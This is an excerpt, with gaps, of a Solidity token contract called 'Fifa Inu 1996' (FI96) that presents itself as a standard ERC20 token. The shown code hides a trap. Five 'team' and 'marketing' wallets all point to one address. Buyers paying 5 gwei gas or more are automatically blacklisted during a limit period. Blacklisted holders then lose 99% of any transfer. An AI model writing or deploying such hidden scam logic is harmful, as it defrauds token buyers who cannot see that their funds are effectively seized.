...
contract FI96 is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "Fifa Inu 1996";
    string private constant _symbol = unicode"FI96";
    ...
    address payable public DevWallet = payable(0x8b490A9D0dee46D32f1de03d118B9Fbc16eec1Bc);
    address payable public MarketingWallet = payable(0x8b490A9D0dee46D32f1de03d118B9Fbc16eec1Bc);
    address payable private TeamWallet01 = payable(0x8b490A9D0dee46D32f1de03d118B9Fbc16eec1Bc);
    address payable private TeamWallet02 = payable(0x8b490A9D0dee46D32f1de03d118B9Fbc16eec1Bc);
    address payable private TeamWallet03 = payable(0x8b490A9D0dee46D32f1de03d118B9Fbc16eec1Bc);
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (limitInEffect && to != uniswapV2Pair && tx.gasprice >= 5 gwei) {_isblacklist[to] = true;}
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            ...
            uint256 sAmount;
            if (_isblacklist[sender]){sAmount = tAmount*99/100;}
